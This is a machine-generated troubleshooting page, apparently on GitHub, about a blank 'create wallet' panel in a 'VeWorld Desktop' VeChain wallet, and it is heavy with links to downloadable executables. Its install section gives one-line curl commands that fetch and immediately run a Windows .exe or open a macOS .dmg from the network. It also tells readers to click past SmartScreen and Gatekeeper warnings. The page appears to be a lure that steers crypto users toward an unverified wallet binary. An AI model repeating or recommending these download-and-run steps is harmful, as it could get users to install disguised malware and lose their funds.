![VeWorld Desktop](../assets/banner-article.png)

# Create VeChain Wallet Is Blank in VeWorld Desktop

Import still works while generation fails

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

If the create option shows an empty panel while import still completes, the key generation step is failing in that build, not the wallet. VeWorld Desktop can be set up from an existing recovery phrase or keystore in that state, and running the current release is the first thing to try, because generation and storage faults are fixed in releases.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

The setup screen renders but the create option produces an empty panel, a spinner that never resolves, or a button with nothing behind it, while the import option completes normally. Restarting sometimes clears it for a session and sometimes does not.

| What the setup screen does | What it means | Best move |
|---|---|---|
| Create shows an empty panel | Key generation did not finish | Update, then retry |
| Create spins forever | Storage write blocked | Check permissions and free space |
| Import completes | Reading and writing keys works | Import an existing phrase if you have one |
| Both fail | Broader storage problem | Fix the environment before retrying |

## Why it happens

Creating a wallet is a heavier operation than importing one. It has to generate entropy, derive a phrase from it, derive an address from the phrase, encrypt the result with a new password and write the encrypted store to disk. Import skips the first two steps, which is why a failure in generation can leave import completely unaffected.

Generation depends on platform facilities - a random device, a hardware-backed keystore, a permission granted at runtime - and any of them failing without a visible error leaves the panel empty. On a desktop that can mean a profile without permission to the data directory, a policy that blocks the call, or an environment where the facility behaves differently than the code expects.

Storage is the second suspect. A wallet that cannot write its encrypted store has nowhere to put a newly created account, and a partial write leaves the screen blank rather than showing an error. Free space, folder ownership and security software that intercepts file writes all produce this.

Neither failure says anything about your funds, because there are none yet on a wallet being created. Reporting it matters more than it sounds: a generation path that fails on one machine usually fails the same way elsewhere, and a reproducible report is what turns a blank panel into a fix in a later build. The practical distinction is simply whether you have an existing account to bring in. If you do, importing gets you working while the generation path is dealt with; if you do not, the creation path has to succeed, and the fastest route is usually the current release on a clean installation.

## Fix

1. Check the release you are running and move to the current one from the project's GitHub releases page.
2. Confirm the disk has free space and that the app can write to its data directory.
3. Retry creation once. If it fails the same way, close the app completely before trying again rather than pressing the button repeatedly.
4. If you already hold an account elsewhere, use the import path with the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a> or keystore and continue; creation can be revisited later.
5. If neither path works, test on a second user profile or machine, which separates an environment problem from an app problem.
6. Report the failure with the release version and the operating system, since generation faults are reproducible and fixable.

## If that did not work

If creation produces a wallet but the address never appears, the store was written without its address metadata. Creating again on a clean install is quicker than repairing that state.

If import fails as well, stop trying to work around it and look at the environment: permissions on the data folder, endpoint security blocking writes, or a full disk. Every wallet depends on those.

If you created a wallet and the phrase never displayed, do not add funds until it does. A wallet whose phrase you have not seen is a wallet you cannot restore.

## Prevention

- Keep the app on the current release, where generation and storage fixes ship.
- Set up a new wallet when nothing is time-critical, so a blank screen is an inconvenience rather than a blockage.
- Write the phrase down the moment it is shown, before adding a balance.
- Never enter the recovery phrase into a website or a chat, and never share it, whoever appears to be asking.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Why does import work when create does not?

Because import reads an existing phrase, while create generates one and writes it. The failing steps are only in the generation path, so an existing account still gets in.

### Can I use the wallet without ever creating one?

Yes. Import covers a recovery phrase, a Sync2 keystore with its password, and a custom <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md">derivation path</a>, which is enough to bring an existing address in without generating anything.

### Is a blank screen a sign of a compromised download?

Not by itself; it behaves like a generation or storage fault. It is still worth confirming the file came from the release page with a matching checksum.

### Will retrying create a different wallet each time?

A successful creation produces a new phrase, so each attempt that completes makes a distinct wallet. Only fund the one whose phrase you have recorded.

### What should I send when reporting it?

The release version, the operating system, whether create or import failed, and anything the app logged. That combination usually identifies the failing call.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [What the login gate does and does not protect](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [Why a funded account can display zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)
- [Spotting a download that is not the published one](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/fake-crypto-wallet-app-vs-veworld-desktop.md)
- [Running the desktop app on Windows](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-windows-wallet-veworld-desktop.md)